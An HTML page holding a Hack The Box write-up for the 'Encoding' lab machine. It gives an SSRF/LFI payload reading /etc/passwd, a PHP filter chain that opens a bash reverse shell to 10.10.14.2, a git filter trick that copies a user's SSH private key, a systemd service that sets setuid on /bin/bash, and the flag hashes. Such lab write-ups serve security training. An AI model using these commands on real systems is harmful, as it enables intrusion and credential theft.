@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB Encoding - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB Encoding</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1678150530993"
+                  >2023-03-06 19:55</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678200962176"
+                  >2023-03-07 09:56</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with an nmap scan:<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.198<br />
+<img src="/_resources/297f150831eb49d48fea8b4716e16c5d.png" /></p>
+<p>Then we run a full scan:<br />
+nmap -sC -sV -p- -oA nmap/ful 10.10.11.198<br />
+<img src="/_resources/737a829dfd1b4379a81322d2db939300.png" /></p>
+<p>No additional TCP ports are open</p>
+<p>We do a banner grab for the port 80:<br />
+<img src="/_resources/06311292fc214626b1c65c49deb72757.png" /></p>
+<p>The site on the port 80 is called Hax Tables.</p>
+<p>The first thing that grabs our eye is the API tab:<br />
+<img src="/_resources/f5babc4601be4dc4b17c221e4c3f57f5.png" /></p>
+<p>We check out the Conversions page.<br />
+The conversions page has a form that we can use:<br />
+<img src="/_resources/cc7a5d5f4d8c4d7f99d7eba4148d9c65.png" /></p>
+<p>We intercept a request to the form and see handler.php:<br />
+<img src="/_resources/47e2bc2ec6a34321a9a0960e587af70b.png" /></p>
+<p>The API page gives us another subdomain. So we'll add both haxtables and api.haxtables.htb to /etc/hosts</p>
+<p><img src="/_resources/e7d25efb56584eb5901de30bd8199462.png" /></p>
+<p>The API site also gives us some python scripts to work with.<br />
+<img src="/_resources/ce6f9ac939c4444dbc2c91ee42e657aa.png" /></p>
+<p>If we modify them, we can likely get LFI.</p>
+<p>We also know that that v1 of the API url is also running, but version 2 says it has a security flaw:<br />
+<img src="/_resources/9332953de6b24010a281a20ffee14b63.png" /><br />
+<img src="/_resources/aefa67c36d864d2caf1244cbfa91761b.png" /></p>
+<p>Let's see if we can modify the python scripts we have to get LFI:<br />
+<img src="/_resources/6e1827e8cba14f519bc9c04d7bcc3c36.png" /></p>
+<p>We have lfi:<br />
+<img src="/_resources/51e659023602414196b8b48ad1083fa4.png" /></p>
+<p>We see that there is a third subdomain images.haxtables.htb:<br />
+<img src="/_resources/2039a941eae14c0b97d53031b7b289fd.png" /></p>
+<p>We look to see if we can read the page from the /var/www/image/ folder since we cannot access it by browser:<br />
+<img src="/_resources/98e0798066614a839207ab37b7a3aadd.png" /></p>
+<p>We then load the utils.php file:<br />
+<img src="/_resources/5d995f6e199c45578d1bc565bfc5b8c9.png" /></p>
+<p>We can see some git commands with shell_exec functions and a git-commit.sh script.<br />
+Reading that file gives us a username:<br />
+<img src="/_resources/e2f703d2d01f4142b739c4c4b0c8197c.png" /></p>
+<p>We can see that there is a .git directory.<br />
+We try searching common files found in this directory but find nothing useful.<br />
+However, someone made a script specifically for this machine to download the files from this .git directory:<br />
+<a title="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385" href="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385">https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385</a></p>
+<p>It is a modified version of this script:<br />
+<a title="https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh" href="https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh">https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh</a></p>
+<p>We run: ./gitdumper.sh  <a title="http://image.haxtables.htb/.git/" href="http://image.haxtables.htb/.git/">http://image.haxtables.htb/.git/</a> image<br />
+The script runs and we see many files downloaded, but cannot interact with them:<br />
+<img src="/_resources/93cf68dfa1934cdfa4b34e91ed54f2ef.png" /></p>
+<p>We can run git show:<br />
+<img src="/_resources/13c09d36556c407abd770826a98622cc.png" /></p>
+<p>There is a tool to visualize a git repository using GUI that is free:<br />
+<a title="https://www.gitkraken.com/" href="https://www.gitkraken.com/">https://www.gitkraken.com/</a></p>
+<p>We are able to open the repo in gitkraken:<br />
+<img src="/_resources/3001aa19809f44cd808735ee8f84134e.png" /></p>
+<p>We see the file action_handler.php<br />
+<img src="/_resources/72e43dba99db4638b85835fd024b662f.png" /></p>
+<p>This has a GET request which is vulnerable to lfi that uses a page variable. from the utils.php file.</p>
+<p>We examine the handler.php file we found through the web form to see if we can exploit this somehow:<br />
+<img src="/_resources/56c654a1817149be97c492e2e29de97f.png" /></p>
+<p>The POST is sent via utils.php and evaluates the 'data_file' paramater and gives it a 'tmp_name'</p>
+<p>The application stores the $action, $data, $uri_path, and $is_file variables.<br />
+The variables that are stored are passed through the make_api_call() function. This code is also vulnerable to SSRF because there is no filtering on what data or files are input into the form.<br />
+All we need to do is pass the following variables in the json fields of the post:</p>
+<p>{"action":"","data":"","uri_path":":banana@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;"}<br />
+<img src="/_resources/36f4cc0e557f4106adcc8dcbd1511ad4.png" /></p>
+<p><img src="/_resources/3da3a21164b44a72b822a393a1202c17.png" /></p>
+<p>Based on these findings, we can use PHP filters chain which is a technique in PHP that allows an attacker to create a chain of filters that processes and transforms input data. This technique can be used to achieve an interactive shell.</p>
+<p>Here is an artcile explaining why this works in detail:<br />
+<a title="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html" href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html</a></p>
+<p>Someone built a tool to essentially turn LFI into RCE or make a reverse shell using php filter chains:<br />
+<a title="https://github.com/synacktiv/php_filter_chain_generator" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<p>We use the tool to generate a chain for us that sends us a reverse shell througj bash:<br />
+python3 php_filter_chain_generator.py --chain "&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1\"');?&gt;"<br />
+<img src="/_resources/db82b5a48f83459196f48d554d9a9e9f.png" /></p>
+<p>We add the chain at the end of the uri_path page paramater:<br />
+<img src="/_resources/ac80dc373cef456f825ea119fb88eabf.png" /></p>
+<p>We open a nc listener and see what happens:<br />
+<img src="/_resources/53dcc1f36f734edc905746a6ccd32726.png" /><br />
+We learn from uname -a:<br />
+Linux encoding 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>We run sudo -l and see that we have permission to run the git-commit.sh file that we saw earlier.<br />
+<img src="/_resources/3c3b1f15aa004ecdbdb699f3f70ac2ef.png" /></p>
+<p>We will have to modify the contents of the git push and can probably get the user's credentials.</p>
+<p>We can create a script that executes in order to copy the ssh key of the user into a file in the /dev/shm directory:<br />
+echo "cat ~/.ssh/id_rsa &gt; /dev/shm/key" &gt; /tmp/readkey</p>
+<p>In the directory /var/www/image we abuse the ident filter so that when executing the script the readkey that we create is executed:</p>
+<p>We run the following commands:<br />
+git init<br />
+echo '*.php filter=indent' &gt; .git/info/attributes<br />
+git config filter.indent.clean /tmp/readkey<br />
+sudo -u svc /var/www/image/scripts/git-commit.sh</p>
+<p><img src="/_resources/590adb4639b141e892d84579884ab6ba.png" /></p>
+<p>The key file was created in /dev/shm:<br />
+<img src="/_resources/d07cccab91bc48739ee0fc572cc94482.png" /></p>
+<p>We can copy the key to our machine and then ssh into the box using the svc user.<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i encode_key svc@haxtables.htb<br />
+We get the user.txt:<br />
+<img src="/_resources/8b417af5240c483dbac5faa1fd48aa39.png" /><br />
+935c582e0723a6b24e8f663f115737f4</p>
+<p>We run sudo -l and see this user has permission to restart any services:<br />
+<img src="/_resources/02c5323673a54a59a0da1330bd7b7121.png" /></p>
+<p>Since we don't see any unusual services running, we can see if we have write access to the /etc/systemd folder</p>
+<p><img src="/_resources/de5346d7ea2f4d6fa2668fa24aa7172d.png" /></p>
+<p>It's not certain, but can try to create our own service that spawn a root shell, and restart it:<br />
+We can follow the template here:<br />
+<a title="https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/" href="https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/">https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/</a></p>
+<p>echo '[Unit]<br />
+Description=pwn the box<br />
+[Service]<br />
+Type=dothething<br />
+ExecStart=chmod u+s /bin/bash<br />
+[Install]<br />
+WantedBy=multi-user.target' &gt; /etc/systemd/system/pwn.service</p>
+<p>We verify that the /bin/bash has the setuid:<br />
+<img src="/_resources/2c7bdaf94eed4dd4851f2ee0049f1f82.png" /></p>
+<p>Now we run bash -p and get a root shell to read the root.txt:<br />
+<img src="/_resources/7d71bf1965374c029589e1665496035f.png" /><br />
+84ef1ff228f83caf8a52ad2819ccd1c3</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
